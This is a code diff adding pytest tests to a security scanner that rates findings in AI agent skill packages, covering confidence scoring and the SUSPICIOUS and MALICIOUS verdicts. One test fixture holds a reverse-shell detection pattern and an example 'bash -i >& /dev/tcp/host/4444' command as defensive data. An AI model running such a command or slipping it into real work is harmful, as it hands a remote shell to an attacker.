@@ -219,6 +219,33 @@ def test_test_path_is_low_confidence_even_without_security_profile(make_inline_s
     assert "passive benchmark/eval/test resource" in (adjusted[0].context_note or "")
 
 
+def test_prefixed_test_filename_is_low_confidence(make_inline_skill):
+    skill = make_inline_skill(bundled={"scripts/test_guardian.py": "payload = 'test'"})
+    finding = _make_finding("NET-001", severity=Severity.CRITICAL)
+    finding.file_path = skill.path / "scripts" / "test_guardian.py"
+    adjusted = adjust_finding_confidence([finding], security_tool_score=0.0, skill=skill)
+    assert adjusted[0].confidence == 0.1
+
+
+def test_detection_rule_literal_is_low_confidence(make_inline_skill):
+    skill = make_inline_skill(
+        bundled={
+            "scripts/guard.py": (
+                "_BLOCKED = {\n"
+                '    "pattern": r"bash -i >& /dev/tcp/",\n'
+                '    "example": "bash -i >& /dev/tcp/host/4444",\n'
+                "}\n"
+            )
+        }
+    )
+    finding = _make_finding("NET-001", severity=Severity.CRITICAL)
+    finding.file_path = skill.path / "scripts" / "guard.py"
+    finding.line_number = 2
+    adjusted = adjust_finding_confidence([finding], security_tool_score=0.0, skill=skill)
+    assert adjusted[0].confidence == 0.1
+    assert "detection-rule literal" in (adjusted[0].context_note or "")
+
+
 def test_evals_file_is_low_confidence(make_inline_skill):
     skill = make_inline_skill()
     finding = _make_finding("EXEC-001", severity=Severity.CRITICAL)
@@ -274,8 +301,8 @@ def test_verdict_review_when_all_low_confidence(make_inline_skill):
     assert result.verdict == "REVIEW"
 
 
-def test_verdict_malicious_with_high_confidence_critical(make_inline_skill):
-    """A near-unambiguous direct attack primitive can be MALICIOUS."""
+def test_reverse_shell_alone_is_suspicious_not_malicious(make_inline_skill):
+    """A reverse-shell primitive can also be a tutorial or defensive example."""
     from waingro.models import ScanResult, SkillMetadata
 
     findings = [
@@ -286,6 +313,25 @@ def test_verdict_malicious_with_high_confidence_critical(make_inline_skill):
         ),
     ]
 
+    result = ScanResult(
+        skill_path=Path("/tmp/test"),  # noqa: S108
+        metadata=SkillMetadata(name="test", description=None, version=None, author=None),
+        findings=findings,
+    )
+    assert result.verdict == "SUSPICIOUS"
+
+
+def test_dns_exfiltration_chain_can_be_malicious(make_inline_skill):
+    """DNS exfiltration already encodes a source-to-covert-sink behavior chain."""
+    from waingro.models import ScanResult, SkillMetadata
+
+    findings = [
+        _make_finding(
+            "NET-004",
+            severity=Severity.CRITICAL,
+            category=FindingCategory.NETWORK,
+        ),
+    ]
     result = ScanResult(
         skill_path=Path("/tmp/test"),  # noqa: S108
         metadata=SkillMetadata(name="test", description=None, version=None, author=None),
